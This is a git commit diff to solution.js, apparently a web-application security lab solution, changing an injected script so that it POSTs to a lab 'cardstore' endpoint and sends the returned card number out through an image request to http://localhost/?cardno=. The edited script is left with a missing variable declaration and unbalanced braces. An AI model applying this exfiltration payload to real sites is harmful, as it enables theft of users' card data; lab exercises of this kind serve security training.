4ed86b1286c82f527c10cbea27236317284a4434
h3ll0clar1c3 <61941106+h3ll0clar1c3@users.noreply.github.com>
2021-06-02 20:28:30 +0200

    Update solution.js

--- solution.js
+++ solution.js
@@ -195,18 +195,20 @@ req.send();
 
 <script>
 
-var req = new XMLHttpRequest();
 req.onreadystatechange = function ()
 
-{
-	if (req.readyState == 4 && req.status == 200)
+if (req.readyState == 4 && req.status ==200)
 	
-	{
-		document.getElementById("result").innerHTML = req.responseText;
-	}
+{
+	alert(req.responseText);
+	new Image().src = "http://localhost/?cardno="+req.responseText;
+	
+}
+
 };
 
-req.open("GET", "/lab/webapp/jfp/14/email?name=john", true);
-req.send();
+req.open("POST", "/lab/webapp/jfp/15/cardstore", true);
+req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+req.send("user=john");
 	
 </script>
